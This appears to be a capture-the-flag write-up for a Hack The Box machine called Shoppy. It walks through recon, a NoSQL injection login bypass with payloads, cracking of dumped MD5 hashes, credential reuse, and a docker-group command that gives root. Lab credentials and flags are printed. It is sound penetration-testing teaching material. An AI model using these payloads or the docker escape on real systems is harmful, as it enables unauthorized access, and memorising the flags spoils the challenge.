### IP
`10.10.11.180`

# Recon

### nmap

`nmap -sC -sV 10.10.11.180 -oN init.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-02 01:59 EST
Nmap scan report for 10.10.11.180
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds

```
* Browsing to the website redirects us to `shoppy.htb`, so we can add that to /etc/hosts

### gobuster

* First, we want to try some directory bruteforcing:

`gobuster dir -u shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o init.dirs`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/02 02:02:41 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/Login                (Status: 200) [Size: 1074]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/Admin                (Status: 302) [Size: 28] [--> /login]
/exports              (Status: 301) [Size: 181] [--> /exports/]
/LogIn                (Status: 200) [Size: 1074]
/LOGIN                (Status: 200) [Size: 1074]

```
* Here we can see a status code of 200 for the `/login` page


* Second, we want to try some subdomain bruteforcng:

`gobuster vhost -u http://shoppy.htb -w /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 200`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://shoppy.htb
[+] Method:          GET
[+] Threads:         500
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2022/12/02 18:12:13 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb Status: 200 [Size: 3122]
===============================================================
2022/12/02 18:16:22 Finished
===============================================================
```
* We can see the mattermost subdomain here, so we can add it to `/etc/hosts`


# Exploitation

* To check for vulnerabilities in the login page, I want to first fuzz the input with special characters
	* To do this, we want to get the login request with burp and save it as `login.req` with the GET parameters changed to "FUZZ"
	* Then we can use the following command to check for characters with outputs that stand out
		* `ffuf -request login.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mc al`
	Unfortunately this didn't work

### NoSQLi

* Trying a basic SQL injection with `' OR 1=1--` makes the page hang and eventually return a 504, which makes me think there could be a vulnerability there
	* Sqlmap doesn't return anything of use, so I thought I'd look for NoSQL vulns
	* There are tools for doing this automatically, but ffuf can also be used to fuzz common injection techniques:

`ffuf -u http://shoppy.htb/login -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -request login.req`
```
 :: Method           : POST
 :: URL              : http://shoppy.htb/login
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Origin: http://shoppy.htb
 :: Header           : Referer: http://shoppy.htb/login
 :: Header           : Host: shoppy.htb
 :: Header           : Connection: close
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=FUZZ

 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

{ $ne: 1 }              [Status: 302, Size: 102, Words: 5, Lines: 1]
' || 'a'=='a            [Status: 302, Size: 102, Words: 5, Lines: 1]
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 [Status: 302, Size: 102, Words: 5, Lines: 1]
{"$gt": ""}             [Status: 302, Size: 102, Words: 5, Lines: 1]
{$nin: [""]}}           [Status: 302, Size: 102, Words: 5, Lines: 1]
|| 1==1                 [Status: 302, Size: 102, Words: 5, Lines: 1]
db.injection.insert({success:1}); [Status: 302, Size: 102, Words: 5, Lines: 1]
:: Progress: [22/22] :: Job [1/1] :: 1 req/sec :: Duration: [0:00:20] :: Errors: 14 ::

```

* Trying out the payloads, the following one works:
	* `admin' || 'a'=='a`
	* This confirms that we have a NoSQL injection vulnerability 


    * We can then put the same payload into the `search` bar and it gives us a `export-search.json` file with the following contents:

```json
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

### Password Cracking

We can try to crack these hashes. I put them into [crackstation](https://crackstation.net/) and we found out that they are md5 hashes.

We got one set of credentials:

`josh:remembermethisway`

These credentials didn't work for ssh, but did work on the mattermost subdomain.

### Mattermost

In the mattermost app, we can log in and loko at a locked channel called `Deploy Machine`

This reveals credentials for an account: `jaeger:Sh0ppyBest@pp!`

We can ssh with these creds.

This gets us the user flag: `288a0f17204d7f4179a7fcd43025338d`


# Privilege Escalation

Running `sudo -l` shows that jaeger can run `/home/deploy/password-manager` as the `deploy`

When we run `sudo -u deploy ./password-manager`, we can see that it is taking in a password. 

Let's reverse engineer the binary.

I downloaded the binary by doing `cat password-manager | base64 -w` and then echoing the output: `base64 <stuff> | base64 -d > password-manager`

This is a quick-and-dirty way to get the binary on our computer.

### Reverse Engineering

Luckily, reversing this binary was not necessary.

We can run `rabin2 -z password-manager` to see all data sections in the binary:

```
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00002010 0x00002010 33  34   .rodata ascii   Welcome to Josh password manager!
1   0x00002038 0x00002038 35  36   .rodata ascii   Please enter your master password: 
2   0x0000205d 0x0000205d 6   14   .rodata utf16le Sample
3   0x00002070 0x00002070 31  32   .rodata ascii   Access granted! Here is creds !
4   0x00002090 0x00002090 26  27   .rodata ascii   cat /home/deploy/creds.txt
5   0x000020b0 0x000020b0 47  48   .rodata ascii   Access denied! This incident will be reported !

```

One of the strings was `"Sample"`. Luckily, this ended up being the password. 

This allows us to get the credentials:

```
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

We are now the `deploy` user

With this, we can cat out the source:

```cpp
#include <iostream>
#include <string>

int main() {
    std::cout << "Welcome to Josh password manager!" << std::endl;
    std::cout << "Please enter your master password: ";
    std::string password;
    std::cin >> password;
    std::string master_password = "";
    master_password += "S";
    master_password += "a";
    master_password += "m";
    master_password += "p";
    master_password += "l";
    master_password += "e";
    if (password.compare(master_password) == 0) {
        std::cout << "Access granted! Here is creds !" << std::endl;
        system("cat /home/deploy/creds.txt");
        return 0;
    } else {
        std::cout << "Access denied! This incident will be reported !" << std::endl;
        return 1;
    }
```

Looks like breaking up the string stopped `strings` from working, but didn't really make it much harder. 

### Docker 

Running `id` shows us that the `deploy` user is in the docker group.

As a result, we can mount the root directory and log in as root. 

I used this [gtfobins](https://gtfobins.github.io/gtfobins/docker/) command:


```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This lets us become root and cat the root flag: `531fe1dc4092160a85c06bda6163964d`


